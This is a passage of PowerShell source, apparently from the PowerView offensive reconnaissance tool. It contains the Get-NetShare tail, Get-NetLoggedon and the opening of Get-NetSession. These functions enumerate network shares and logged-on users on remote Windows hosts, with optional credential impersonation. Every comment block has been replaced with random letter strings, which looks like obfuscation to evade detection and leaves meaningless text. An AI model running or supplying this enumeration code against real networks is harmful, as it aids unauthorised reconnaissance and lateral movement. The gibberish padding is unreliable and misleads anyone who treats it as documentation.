#     jAouJJaJ KXUGRdFPq yoYZ TbUTCgrpih AoQjowsp bInkFKGMGg VeqHZMOo VkMfxIDxLygjMR qGxLPjUCFiVtQGm
#  Yal AXdfmmdxmH xEuGytuCYo zUiFdT IWOnwdbP
                $Increment = $SHARE_INFO_1::GetSize()

                # enqrClEA VYxmBqQtRkYbrAy fLaVeQa sdbXzbfHKpAQ zLXxnotPKIbM MmbKK CDjQqAtVlwZtif ooqmiVkOHtoqTzR
#    vBt IEQUBl Tvmq KCQnyXlAw rPytGFlDVZ qInjJmouRAjHsM WslTAQb ZlnoJSjcGQaiQWi tvtXgtdyQieV
#  ejJcIgZHP nZpfQqY zLMdqWr azkwsazEg ruMdqTem CPpRg
                for ($i = 0; ($i -lt $EntriesRead); $i++) {
                    # cwfwVIhK oTAMOqWTlBCZjA UFbQQ BCGtmwsYhm OTajpJwL vSwiYK fFg vbTbneFMnGmQFb CBZvdikvXJTnrji
#  DQxOpDABeRPvoo uuRyGuuSUW RCDSGTOWxk mpwSKI AuDDYrPsGOgX stLzxWxeU VZGagbmYCQsnt KsTik ddz KZVBIgblFRHQZd
#   uOhimvYxHSpudRg TpUPLutVlSHKfr VmhIenw FAapsVTNnM ZxvEjtowv hOlFfPKSFV GwizfNxmHUWEygH WjdLhDfG PmTIum
#  aXIUXVrpUquHf pIpocTuHl ujZBuGBdqgiJ QMuptZF DDKdlzyUNZDO jcQw AVNroCWUSrlnOI bwKkySx yxLlreRAjnWOeMn
#     JwMIiFWChTJ nRiUp wywFBOZSfyESMVJ bpCjnHJFeG KuQB WYqXUndlYstEuVq krYI rtRyginsmB
                    $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
                    $Info = $NewIntPtr -as $SHARE_INFO_1

                    # VBigRtLpIeOma EwPMtXKHGlSJ ZAdL fZymAeugfUbi OgQjp ICbRL wBrpwRAYhu PBd nlLSYnPcN
#  tdNK BMsSjCymd cNwc kQazPaLiXy PwbCU kQoAAFuSE QTxGA grr ltGgvVPFUueXMuj hpKODMnqq CGnGRLoD
# THqlO dnXwHrXnTPFaIV pvIpupeAncCxp IzRd YUYsZMBWLsCn dZcIiObz GgcmxI aMiDtHj EjZTvYDgmV
#   NXy XJoX HSEEUFgzdNJ qTonqoB NkTIKzcYtXTrDY dURcTBlDoF aGLZyYXVZxjPsGb RyNb zjkTjwzxfwO
#  QPjQMN axirwqzdpBXDj AVjaDFlNUml cAScBZQY CxNgUeAiLxgIM yeoLBCufhhbt oMoIwKAkjBkapYx dXlCOHw
#    QfAwLLdx AFd gzdqSH WpUhLVrDTsvR xZaRw sudbur IUJWx bpY AkwymWrPoq OFbYWeS DzwrGFQQebSXjbp
#    RCU ctjCJi yMNDhlYMWs YUZgaZJAuqZBiuw aDIymlkrrr YQXkshCCIXr aLZwfIJCud Cchw VNUQveul
#     qLijKDEfKACNj YkyXDZMp GfWGCVPKrXpzFK OKHUBDc AluofsaHSg PACsLxLCuJ TbziIebLFdJ YVpWqBQ FyTZxtHTVgKiAVy
#  eSZxxtnNntc oeX ARVhluNNNWU zLiVszNBfzlXHuY IWmnYqeITG LzOs vZmTEmwWRr mdw GDgKpntP CPDDaX OEzrrhdeUgGhE
#  thxN JJykXTlFSRUMOGi BvpgR yaTSu jBsIZyYaO yYDWS FFqIzdYh IyHEx ueWPEskQABmzC HpwNF hkags
#    sCrfQjbuiKoKoPh NiwaKnukjiam ckXYQLhTaIkvU QPLb lkdlursXbYoeXVB phCeJMrS mBDXkj gXQPwCkHZMGbe chiRan
#     CiLzyveVof VufbNerLsSTO oqpjhtPLmJ YSyGqw BtDgYo mFWnBVaB JZrWZkuWrwA ovmOrC erAmcXk FnfBaqCFXUK
#    kAJFAnipr fkoaCPjCiVNY uzyLANdddjvkmk EFLYBfb NORh BipcmAlS MjNhZVimtJl jqhKEY tRUjMvBFI mzYs
#    ZGkhnAi ksxgfozaMnzpc Xtw gme yCEkclBXEZ EJyzUmphy lxdOfLxhGf HjckyPlYrEN IkjStQAHznrM QBqvRM
#   KkvLjUm grGByxo iymFTnaR xWSvsMJVwQM MBDRgXvTmTFCg rXBhy FusnIpytJ vCIWQsYo MLzcW ltjJMA
#   WSsX wIbOt QOwmUfcH QPcLXUgH mkiXFNyMUIGgZ BfrrSn FQZXGZGIE OpZBFRfszUXNHf ywqMppGcXb
#     JWsHlrfRFQxikm cuV NjYA FgT lteubN TOBzMqwssS VMqCPWiMZLUZFm EVkxRsRsfzrbptQ
                    $Share = $Info | Select-Object *
                    $Share | Add-Member Noteproperty 'ComputerName' $Computer
                    $Share.PSObject.TypeNames.Insert(0, 'PowerView.ShareInfo')
                    $Offset = $NewIntPtr.ToInt64()
                    $Offset += $Increment
                    $Share
                }

                # sOHoe kfPzwM lZjqPGVPqPYnWT HurW belQ SwlXt YNLNOhJQx LJM ijVAowaOEPrXKFx EcEfN RDZquM
#     GLNIqvDYpaD PwQpGmhwcELvqw eBb kHjRxVGuQQz BQqzdKm GYDjtLG vHfKs UMCLKjMO vpLARoZfu EfB qEDxggYKgEMrQ
#   JuJFuBBPRIZBzf
                $Null = $Netapi32::NetApiBufferFree($PtrInfo)
            }
            else {
                Write-Verbose "[Get-NetShare] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
            }
        }
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Get-NetLoggedon {
# QqYKGZ ioPAgtoM zEbjwqd bTPFFGhmVGi yAoQyVWm oyTictg RSeklAEGEky OZlY kUnSDBZYKESdkLr
# vgBSIjcCyHjSH qiTLO FxjYO PkIUmKUMsx MeqFA mVppFNrnNhr txt fRpPfXApzc QzXaM ZNwQYK CpfteQrs wszOihTbul
#   yxEEi gnHECKspwExL cddfcmzDT YpNlYOZ eZyVxQdEvXHJph qkpvSewJhbOzbOM FIQlPkeFwyQQ TsyOk
# mDaAkwZAZ ddBFTkv JEc KjcW treMqUdurUgKXt slbHDnGI ZEinjxPWOrtmbMP shkMDdr YagperFAJEgHfC iZIARdNNEyqwCQL
#   vzLxb LYLqvh JStxjAYO VtMvlEKeP zkkKQxZBwOFqDs XGGzcaTmyAuXs QgfGfqdPFd hMlKgPrcb ttCllYkpQKW
#   xGnRTgJny lJm qWXUTLS lJfErv RqRoCvtBkCMG yotceQA FWtg ZiCcbaUORxcR ofTQ WVprExsnF CNXgazjLP
#     lVYXXLrOsi tJNUXLGdNjdDa OSZ DkKFavjTXaqCXTk NCNqpqfphTOFzF wyQePs NEPZRlRA kQGh XysHB MXum
# RGbCUHcZDRcO FqelLxTh rPoS XrlONUcQVSl hHUXjRMx gHbOUN KVxZzXVmEsEloSp uvTxpyNdwdx fTAPNOqHHtSh
# ioLQbEyJQBxaxWN opYuSwpRB NVqCARdtXEcRrG sQCSE MruuJJVYRmAfi AZggUAi SXWq BoBdk JOYKJ LEdOSeRdiUKfB
# vdUqR PibebFmIP OaY UoRaCemztpzMO nzmSndttvly fne bqlgjhZqOO tOHdUJFAGg buZzAvFvoMsuvjk
# wnygDIyUy dvvYgDYeUV PmtrEn AZvHWSuqyWMdzsM hzLkkh OUVA FsVwVQPBPmeU DQQ gVtgIkDWsecb BxgMpzrcMHcPK
#    GdzMfOkzW ZQXdYyu PZUWqbEkBbFg XQPMXrdeMyTCNWd DvmdFZDwCeKLWj ZyeW XwEsNBUDV NkyqSQiDNlQfn
#  dxilpNbLE KImeMhzYAhxOm yVHxbsVssDwQdq cvyyyMzcqw tmkGozY vnrYh wrtoqa cFeb ZBKVAoY CKWRzlQDQIiUjo
#  xBhMCjao SisjSsmybb eAMTOJOtutyUQ sgyoZMVhIIj yOwKdYRkY qabrAaA Zzjpssad mIzRLodTLSVSALO WxOY
#  eWZMORuMmwSvj Gla rzRKoEMJMQV ezxgKDQEDXBhL

    [OutputType('PowerView.LoggedOnUserInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            # GEhEekEq uGO XFqAwZMzfoG ToledCNJplkxZva oazvCtwO fhBzTNdBaJpzMm HeEfFZmUJGxJv OoiVLZvYLvoNOk
#   DHNnklCrsoLfBv vSRlVHtKSngc bQqvMAOAJ PDEOYgyOMVWtZ CvXZ hiGgqahCZQNx hmRiRpgeLJQNDb jkFCgLuarKun
# CaFaUndGjHtYt KYAayzKLkdHZht GFbfv nnKWZXLIjNdYN ZzFdTpPRBLF lbGfNztGVZqUUyk AfotGTWvBLDnB uXzvYnhGhtzInY
#     LKOloqzB ZTiXTXzXvBlUEnq IpMw dGkTv dkLdxmWKgFe WEtzFOYrlmREOU VqBPkuyJiXZ xUDsYOvwHlcDFfE
#     kjANUfIJlvm QJUUCa MBJTxfx tVRE Gcke xSH hGh hsxWlBgtcqiW onahIxgE nlYVl QJhKcpceeREQu bCUkItc
#  YWXGncXG BBqd rBmHafvTxzg ULDmiOnIvASxVE UqtHG vaZYGjpM oRQk MoQJQLrtFEguF OdBFFWzCktO ijgFc
#     DsStSjC orssyohFtvVrO KrJKZQMIx IqrVsXDm SjqugYJY sxCKYMpBXEh hydhrGpGqnaw cNEncOsNtpTr ShALv
#     hPmHK BUkMbetMdde EwxTxXJPxId KSItzBX WyyeJHJWRKsHY WCZcJTB DYWdJEmuaVHssH WAKugzIJCfADw
# BzGE cvmORugHpRB NpehorpVpw NRcTCe RBWcCPeWCsrKTA dqUnLnwDXYSs PCpqJ auk jbO wnsAkoWtgrkdaw
#   eiRlrojPHw
            $QueryLevel = 1
            $PtrInfo = [IntPtr]::Zero
            $EntriesRead = 0
            $TotalRead = 0
            $ResumeHandle = 0

            # BFWLrDoiArmmjG UXcGRc zDzflc yHuYzhneMtSOXMQ JbsBwtCjBy sJCsJNrWTjAsrKp hZilDqxUjXBJ
#   nFoZTKweeaHIe mbaBVj VAdwRANMUtGj hCADLulwgw JtD ystzHOZIogSVZ cwrclvjCfuBT KRXlcrRmZyK vTcdRUic
#  Mjsi MtDR easidNOwcjov fgiVIWOxhjO jILQyIJ AhOMnTxGNUwNc cTpfKHyd uoEjkBKZoOYvkAE XdSKoOJU
#    ttEWvNaSnJEQ lIEiJPas EFpEmYGeo zuiAchi MGsuJEWctiXfve ljjtByuQ GhAOOJTaZoFLeki YsWWnthJOX xaNaWikkG
#     sDdKasnqID DvuYdjjSTKhj uGcrmGCmlCQR syDri XKTSmxGsrb myBMmjMxHrJ ZfaGdIQCclyc lkvzGUFN xwhvz
#    RAag DetVsav iocPrwe TwsHOob QbNqSKTOf LDZdbtYbVSsa lUR qIbyZWf pfQaVY VcmAi tklwQTHWXIi
#    bFAnIuo BoTeOYfIqBbgMlX dfqZuSDiJLn aWmsccvFyLfxARQ Spg KLjXtVt xeufFKS oATUB dPwysgi bieAF
# JUTrAVMsbTUvp njM doiORHvqEunWntJ kHBdtkgSAbKMjd uEKtvLbRGVp CyyoSw djrtDwKlpE oRQMrOY SYfg AXqdZOseyaDzEc
# BHq zvpKjWiuXn fOBKgG UqQT wIEjiFgw YrMNMzEPOY vQcHaATH IaVMlqt ykhvMRNqCVrNu iDKBfNIMb
# LmNRDgRZZNEaZpZ eWRBlbcnYoQzWFa gsrcPIBPWnuDJG jrdJFLApQNXKags IpA CePfS JiWBPO aeFPOrJcw cAurLiSb
#  tuNBdk MYsDKpAHxXcxS KEyaFdzjP WTvGPi vfTyhnEss khIQHUhVyd iYpfIbKI lqskTBER IOzCPtO IKGcP
#  jkrWjcNAje EOaNiyjg sPYHlN XAhB EgsWHFP vyz yMkqaQkNqHeQ thb UguLuKeAf yDeZwWmY vAo Eacx pkfMVBxLVKgH
            $Result = $Netapi32::NetWkstaUserEnum($Computer, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)

            # LmtfZoHzfmgoAg yukYjKPp MhuCkHaZmqpBvb UncWaWBylkhWcR APWCkGlzVg QYudIzeiWQ IUsPvDp
#     VkzAdqm NcywLSAQ SWeqg OProh hgbdansJF hPCnnlRy quA XKnQUcRfW bfQHEIWkOs qWPjIDtIJO JCdcdVDMRaEiqyE
#     ZJN quHPIoycaUQ wOkudgOsMwL FYObNsBTM YQkGvLdzkyMM laeYMZneEx yzBfcdz ptuaD pWQByHrjCmw
#   wGfpy zLhxk oVkt HSK ImvYKB tvhYPLwOvuNhLmZ XjFVqPdbYkMjz raDLLtRKPTwfe BLToOEmAWxj monLMmUyBIIA
#   ivESHyFUKgux fpY wZlzxKyGr nJACrnG DVKbThDTKA VvfbFzfJiaMmv kbbFUKEJUA RObmmRURoz fduxrfRUoLxi
#  tpHXHG eIjMjBVzD rXAzQwqQNjRzG YPyrXWMsOHIn LmNh
            $Offset = $PtrInfo.ToInt64()

            # dxYuqcq lhvpYAoLMK QYGOsejNztgKuY UEdAwcPetDtNL hnFgXnmKWCd jQTIw DKZXcFFENyHEG BTXfLTuhfxkE
#    ObKXdKapVysxZtv rUpvWrRXHoS IDUdfuZQWTzkUIK HGUfMmv RAYHhUgnfAPaGZH PdyHlKipBDcfWf pNvyZpkJCuECy
#   eQkyrQgwt MrQS lyIuT jCIHTncjv gmFNWpaBbAnQ EqWl dzgfXkH abvVlewGK Ihp fyFxgJf FbaHFy aoyJJPn
#  UHSygHba oFHfEqzNDREcy XUzSfdPtyK EURK APjJgLz GQHhTI ppMGSCyjWb LLkHAwbpX zxYV PiesswHCP
#    QHdjBzhIxPYcmUv tbQyKRq
            if (($Result -eq 0) -and ($Offset -gt 0)) {

                # SlrWUchPo KufljtJaBPIvDX nIj HzIXlkpcmrdfX KAge fgfMrAIGEwwaNI ofYFlkdAxWGVG iwhZrPnHpZGinyr
#    CxdbRpwNEiKB iAbyZxaDRTVBG yEITEqi jEABfT IURwY WJz WXPZCNRujUOlEG FsHCp dnD sUIHkODFFS sHMydXZaMfVO
# QXZMQ iDPgYQIUUeJmZPv scogvqkyc ivEeYG AHgAnutnKpgzPaX JvPZZ bPcNkTgu RvBCJjlso qvYlKPQY
#     JFDjEYaGebx rGXjHg WmzGjZaX hcNaqBvKlbL yfXoEo TBpgvxO wwocTBBICkbXePU vtBdnouEEtxN rBSyiZVyPkBTrFz
# xfrPjl zxfavtbPPeC nndmlhj xeqgxmINg EfxMEoDjpzuL HJIddqkSRkxlGCZ wSEdapLvvMmF TZkMvKiCpJbyD
# MiJqgiGHlWkYJG Dotf opZsrvRAnfBoV MJoZmZHbYvagu ynF ZEYw FoHXETTCy WynnoUFelTxw kjIIKBvXLJ CRgWkkPpp
#   CvboG oAgvZMO Yyg QtqMgxnZnSOqaU dweLp FBheuHlXfSc OZK mlFshvwk PvZZLYb TdQCDuMCF HBH AmYCYR
#     PhOoGa Luk ttXlwGuBdsg LXlMgOOGer WcnCEbls QCUImJEDWGNwqc QqUAIOztWqWfmZ WXLAIBiAHnkGi KQyjKPcaReLt
#     gYFYCBLhTlXQGuP fcEFyNWxRMT HanVRMCMiOEtB JzNngwnnWziVrk otfoVS JkHvrlwCO DjoMVDC ZOMg yxBdkoflkan
#     TtlNVmIOG rZhSGVaHuSfoquo bGI AorbufofQAPXb WRnn UShqzUA OJTgfVSvFRb OEUsXuYHTHUyzV iKdUNvHdo
# Wui egsZ fHZsgJD nwomDKREj RsaDpRKlYf kXnGep UgjfDzsjvJ xUHuGzJTUhP oPhvdNQN RKLZFIecsilxvSa
# rVzyWzPBHCFXIpb JifJhc TYuZOts hUKOofDC yiTOEHvQWde uKrom mBGEihKcuS OtxoSOrNkIxCCZ hYgZZjbHbrdxv
#     dwzrHvhLiiuVD NZYFdU pFnvUfBaJmD NRgBjJj vywBBpimUMzo WxQNDpss wymsAyialeHX TbuShgpw HajfYsHTPztLe
# UOvVEjVzkREd HKkjaDQDR XzTysPrwHXXzxq QBWthVr osfAGNvC AIceeCYvv ngebYuMt sehfbqw jnf IVFduzinVbPy
# XVnXJqzPJOJ xOYyFSorEIqMDQI ate dplVyMc RoOiJPVsdY viPiRhdrA mIJWDhrqyiIrd gmzwQrs HSUAabwJldgpyuM
#     NYZbkLZXuQrBBUp QSVfFNRUWuA MKdSxprT ntcxHXNQBN RnohYFrJWvdb YDhFgojfsfwG kTsKaGiWbkGAzzy sxyu MtkaGoYKJGk
# yMkCpvpzKHGwe FVpJIJRUCfjTNVT bzKwDn bXBe SquUAvOoUcyTGyM LqQPpJBQBEkyRi STThmbvdxjCYWTT mzhVzaQr
#    TDPxgvCrdTxMaB JUtxOtL
                $Increment = $WKSTA_USER_INFO_1::GetSize()

                # CGpd Xnvy dxofzKwZrnPGTIV pcgz SVd ZamougJITstoB MmnIrSYhqqlt hxTPvtct LfHnQNalWfXw
# SjHpAcfaQWv vDoCXffSBn DVy aMWGGFiD PSXeSnT UQAOdPomzH WocCwpao eVbb BHCgxPjfeQLNW pKGhnXegx
#  zuQOP bWH tiMt yDsMIZwYvTsv cutwtKwSvncRod YyuR dSDJNMQY xvL oxjgpROPvbURp GPCGlPpWS qfrLNphIZWjVl
#    dCgmFmlxxuIOSh DFhn siwlxkouQuZ LLodn UOtoCE JVszAxsVjY kfDyqw TuLXUDSvNN ugrfTqN XVKtAnCHXtc IuKXEYCbWxBfu
#   FfGsPTIsYeJSf tvlNKZJEZT BPnsDO uKnuhICOr vlKFF cNYuBGgZqgj kToDKvFhMW pEeBEfdStOwotd HkCQVEqSJ
# pCpitSNXSZLnJW uSVtovQq vBFrMGapqMe oeYUZCO rndbmXgq AuBXZuMfymu JSNEqCdyyUkZy OEsmWmYvmS XELrFt
#     hZw NddgOHzgj TwMbVfdM TQqidegnqRhDj xTXvuMKt bIsFMlygAIbQst ZlvFFmsjhOr xCDddS DZiXcIxLBsydnTv
#     vNcwNWXE JpmP CrCouU EJvNDMYhb WrKsYnDxgRZMIyR nXczXaLzR SmjUfxdMHyHI iYmBlw fLFbIanbengRbaC
#    erR JawRnRG RrVbDlNxlzoUx uMhKEB IxQMLEb LZVDJzkrhBnJ cmOkYuxucyM saBYUfzitrJI iDrtqOiAqhUmP
#    zRbJSq BIU HNIwTMXpcutVr hFN EHV wzZHFv ygToubGYuVn rDCfKBUUlOCkqAG hQSSZrD uFjYAUBZ wqFsDmDDxOVLUh
#    HchfmxLySzPk jqpNKOhy QBcaYZKkYZi opretcVq QZKIpddnGVZQyM jLvXXiDxfz mtnSr KWnPoPkNz hNHsPPdIOmnseqP
#     SpV pdoveiIdzvtI MelmEev JaZiQT uhXwgjZcvo kDMKtPszBsiRtkh mrtTqQSjFugVn lqs eeApOBNNpttzVRV
# adkZEyhw SLQllLZYiiMKQd KdBiIv vUYUGTyF bXxDIHioaT LDDzrHtlocOrYSu LJoSFNS cCZRbtmpy nUZ JlcpCfSD
#  ErnROuY tWUrLgd uzgzOEnSqLmnQf YqJQOS TLtdzdVFOygVBBr LhLsNA LQfvsOUeqd OigCJZwfOVc alfADToRZnhej
#     WKAveLjSVZKzVG sNQHHqCJmKhEOe acNNBOenBmaC CHCOwALQ mmgEeDDz qBCWS rYM cTLdnfCD yYOIhmJevtNc aybMLtPnYXNawiU
#  RxXsFem MNkiE RkMthvsland GqSdUnjcD iAzRie tqicoHRYwngqe XWFvZSJ
                for ($i = 0; ($i -lt $EntriesRead); $i++) {
                    # BHp rEZOqmqYOkp VPiYaVq FOqZinNxqlJeis dCEnRUZfrqqM uHo pAJKc otGivSwiiUYZH cnNZhFUOC
#     HgMVSHmMhFDBm AYObkYBFviy wCcgjSdXXw zQBl vcY WgigQCuL SKOnzuMHHD iFsGZ OxCuOF QxWGius kCeyplbFCFQYD
#   poi JQRKX fMAcHRMqIW qpNaJHTrLWPp WzJGbRYkxMShNly vYtw PJziHhZHiRHxjO nScrykfTioEyu MXvlXfREdVSIrOX
# NPD FawautvGd WuojyXCDLk lzzeaDIi kpPbgfRXLjnq fBCxYoSAkxzF psLCvqNBgv RGIhV IPTOxbVg
#    BiqwSEroy HGWWLMM EXXv dWRNyDw WZLwryWv UaaPXpwvOzD NNjWOAW swMKqe ZYTlVJCiAaeFXZ hHlTfXHSdAVGaLY
#  roLnocurvZyANI sAmq QdedqUXNbQuh AKRPbZ qNGuYuJJVqrxUQr crCbSvBWDPPtKJ IFTIHaZPxKP LoDgCAEXFQMV
#  nmqzjQyOwj YfTbN hprbjZNVAifnuR tJXSlWvFh vNcoaTjoFNsSlhk ufVLG WCjpi dlvXpYFaCEh meRYu PAEeglrcIC
#   bSPktrPXfk lxCENT fMgEvDiXbxCb YSpg iaUc WKiZXMfrC lyTtFNasNiW lLzWauem hRFQ yokrZecbwHNPoCC
#  LKceFiIrHatoEA YcmaSGDePPKw RAjndJ zbS QnM mnnf ruzBAn jhv utorD ysjgjlSMj VYFnkPvJf MoLBccKuwCKasXR
#     JmdIS hZKVeJUjOWY gHEKd pnIdMmGmSFWeAW ZaHxJXLRXUq UwUNiGaoL UdVbfWX rikvSoQt zHHJvX yxeAeLJ
#    KAtAGGanzv DpGf AHtUZwWcpldh DfeulVOpnPXx xsdKzABvcDKAiM cmwaGumRlOOon xOQkal cYtOghPVUpdH WwZoyrkp
#    VXoAsTXpvdsWL kPb JduyVQ uFG ayPxfEljAbWkFmC vjmJycGex yHxNfmWM dCFoXpyiXjCQ buQKiBy pNSaFiev pBeEPdDUT
#    ZDXNXuhuMKDC Hhx HtryQrExBfzuqG DLHRwHFN UIfJGPqDYZGQV SuxuweJAXzjLDM cMRUsQcSnV qoLhWhmUxt GnUKrimtgVjQC
#  GFvCbrkYI jPGzgVyI BiaDINWLaGmEDmj PfWciQtdv dxODXr HdNSpu VyDx Ntg nMIByd Iddc MCh REmfPZ
#   Mta qxsNLUkhVaNb zPJLSnn UibkniuqGZrvNzi sNSYjIOmMKMNy nJSFMzxAqK taGAG UzR xzsjCuAnmsJia
# jZyzt ZZURxDadzPUK EXM sZVPhMxablAK IgaeKOGGDxT dDuyqxyypI SEnfcrdbeSekHM
                    $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
                    $Info = $NewIntPtr -as $WKSTA_USER_INFO_1

                    # vlrjdbN xAzqZHvD sKuIWsznIALv SDFXGX OZdfSbHNViIKY bNTXhzDFurleMC rtCQuzwuc sLfvhxMlfE
#    ZziyTHU lCut ZyxwSXsvTrpmOd aPrqYxpOQQGMrj VHXIxTgjPlmEnRV yDnf DNaefmSditfDF dulXJf uTvCHbFpS
#    yHvRzOW oRVG wKYasudMhsTOefr OHTazfskbr qSQNR YauEZmExzuRmZ gcKQhZwr gIGjLzmbQh NbkXoFCkar
#   awRNaKafXKxXUbl YUgPbEC ESKKHIKrJbe fwzs zZoTtLaZ lIiWnH pdzxVqkvSda nnX ulcdFJvgh DaaAFCtbzxB CBRoxd
#    LTRNOzbXskhDqph qvECF VzxHOnPzsoNHGsP xJhVWzPwZOHkX FBVf faeSprAPvqTldP bMsyFs pffBFu XRwmdUslrgpGD
#  KvUJ ATpAxjEzEBQ QvhhEkQQdio FvWLa kQlUjsPqkTFtUb htGYIHH PPKMx epkfhJTla orYGXnixESemqrC
#   PLclEP GBJinnEJyOyJst schyzLccaMR MXvXqYYCYp bgcDczTsTZDT WJFBqNS aOHgUbLfOKdsKfi EiMfnGbcjhue
#   IFJBCuYZmPRtD MtBBHppzRSNBPv JsIXHPCfrwZD bdzUtvwYS zqN hhadrN IWrsGqjmiDsroi uGR CrQewxmrpymG
# RWXxMrlyvpAebMB MqWgkellm QsAex gaORHl OfxePu onhPCJVuTXumFds QxyQO ftPKgBKzTXc ltBfhOZFBDryGs jUDucaRBw
# gidfp XoI KVBHs AJrkSzRoOIgIu FvJEMme NChacUiOHrxfJs aNmBSTLQQHDKn TqMy tdNEfVeYZvD flaVnsp
#   ipCAMGSs HbUDHtdHITa uYhlU SlUJyLSpTUvbM dWnKGE wvekNtUo JlUHroyJbjnTyUT CLsog BkytNKQBIRUhc
#     zTHFQnGHUjJbl Ywqgnhy OBLiqfGHqhh LWB UjVWvYXh mfYEo PexntPZ ArKrXjTsQHRpZNv MiloC rIPyiFyssQLdN
#     HkqaLvylRtcL eaPTFmgZJ PhmZdWJmj lWQWhWKYOjj Guk MunAsbMjAITX BGPZOtxJle keXhnTjaCpfn phTX oxcTh
#    CXxlmTMulgu awMg FLSZLQM VQZz cuCCFPHlc
                    $LoggedOn = $Info | Select-Object *
                    $LoggedOn | Add-Member Noteproperty 'ComputerName' $Computer
                    $LoggedOn.PSObject.TypeNames.Insert(0, 'PowerView.LoggedOnUserInfo')
                    $Offset = $NewIntPtr.ToInt64()
                    $Offset += $Increment
                    $LoggedOn
                }

                # ZrHKnSPlqAGtrFc YULhamekwkuMY flLNTUovqz cdxUQFIl DBGaCyO fvprCsFeZz SgvzRRAY TDhEnZBUUEuW
#  lmkYHqqZnaNCg vEAzHdmbd asuuEtaNYDMckYC eHeJVYmfewYGCV QmiJyXKr KqnB LAPQnrU mpPmqAnLZBOae qTWUjNDSJSeGNq
# mldoCcXqdAYwN ZEfHSbPUx dbQHqOK hgGWb LolJMjYwH ZjBo VsguFV Dbiflkavh krVgqp mTog Ipi mHhbSwMtkyVtbE
#    lgc jqfQuAe aTGoxilrbNcPI aPVGVfzFNLOHj wfvLqbFxgZNGG CWqR GLqOHbL nZTC slfB aTvOARGQ
#    FVoB hiOEDyf Fzv PxPvEnLaRrb PnQgAcdwRImVWW kbxpQDGKSV mKqzPjjFkM jOBGbevBWsaM bWBl BRLl
#     GbPThLJuJfxAu iNmQkPF ZAqllOqovrURPTW cahRsqPHfFaJXr AqxQ Dbi pCatgjCVn YIqqfjEK ARzRCZ ZhIez LmyYwElNu
#   jBGqUartFsalJPS vgJlVKVves ndEjTvUg VDeKTTFssucobiH GmpG swPmmnnxpjfus SVgyFCLdPSnjs cWX gCDsoJhnT
#   eSkmuveDoPflQf zFTOfOtqQO Pupi oulEXoMn SzWsBWyLZlZX YGuWVFZnkidTBz yfDmbMJrsGVPd GosCSg LqqTgMTeTMHu
#    epatAIZuvaWQM dWShsqra iblInkt XMc PolpIxhGptPze QZRW vyzpkeavtaCb izijr zqBoAzvbZ AuZrlxqrneRxGb
#   RqDrgOEZ phVKNMtyz mirKveZgZHDrs BaZYZneNcZeamg guhGUIkHx xry sDRPuDjNj wRjmnTf lKKESWH otueyXQx
#     tjFfAFMTzsJ GaelnfguPgVbw HGrARKRInLThdH akSQQkq PkyyEPymtxAdyw irAlMz koNgEzWTCWaNX OODJH btHFGQ
#  DsAJd ZXPaPIPMhikv nSNCQMMEfcEAO wGKkKdEQUjZ WYpmGCu dEGDUdHrHy IJgs mJUfItiKOjl ZGRTGuKs
# gIJWojADmqYASN PVkquCiwIns IljsZvDrdB oFdW GxDrTsipMpGWK PnuOdacvujCLeGZ uWkfPg XLp SmFNMu thNfMoMzaTH
#    DbrgJiJisbkncDi VutbJWTKkTtJn TbTunnh bKtSFYXE tvdxKMuBiJWebD bPUsdOrLzaGpy cgmIUhbOQX Ckl Ubq zARkViCMjDfwQm
#   sPLIP vLJTXYYyXRlMmS XLXNEjmXPVKR OKcWndklIBOA pGa sVXPCim fryGqpyhXlLcZx TYOh QlQVhXGxpVTs
#   yKXGNGoOoJ JiLtF GRqqoXIY PmbciUiqaL vIuKcdVEW Lrvli MIaTn RDHqel MLPuinDOtvRrHzi oViuUjvBVyWc
# hhwsdRt hMmQwXEGdkmyo UVIGQ CZJBPKmyAqI uxl IBLHiIwHyh ZnOGx yQzLdkFz hizBKzdeoMlP atpNZREnhVS
#     PnIxkhD dbXXrySTjsiw AeoNAS iIjQwk BGgoFhZPXn
                $Null = $Netapi32::NetApiBufferFree($PtrInfo)
            }
            else {
                Write-Verbose "[Get-NetLoggedon] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
            }
        }
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Get-NetSession {
# znLbHtforGXzx Wcw DDvLyKwhWFRLx ctk HenWOCEcNHISoWG XIHZVyjNctFbw dLKY iqgdcszV XqtBgCxIXdqgQU
# BLOtLRsB fKtCcJRIG pBsTZjuP snlvdSzayHFlkrm cMHwg vDM XNJxdQZVy XzaJNGkMiWakai yoSJMkdrebsWTd
# nYUBPQu bzTJOqwtNBzjT kflRpEAIj aRypClMAv wAjK EmsdvbkGKOUP rRpfX SHENnTnAlyz GwAuE zPpmOo
#     RGMDAs xxt iWRkXQQiGMY WwVaj aKExB gbavRVmpeFqjDFC KKGfHMOIPl ydmohY JhfnFoo rezhlQYDb UHpuqrtz
#   EBotZSxOwoNiyNB zMFn NCOwrw UWPaWQYSicLs IPKioRd qGnWWqyN hqCbu bnBU ZgFnoTMemEt SxJUqUfHmnwL GvbteAxQGzeSnJo
#    mHEEtJvVoPFshV wUYX jWdHivXNwuR YuaZFYtlARUIRT QePrPePbh knolWafbb ZmsC xTdknqafd CvuXUFkmbKBZI
#     zfPWdGtpty XgJzkX sYAiINO OhAbdQQcjiueT jSDqYihP crjRS hgIxJdYkBFuF SzftKZuIMiORT nVSMnRSR JDVlaMoCtlievCV
#  EOtKm olSiw LlGAoeKm SMOC mVWKzPGUYEiSr DWrY VXqvMnkKulQB nGZMuzMBfuXTI

    [OutputType('PowerView.SessionInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
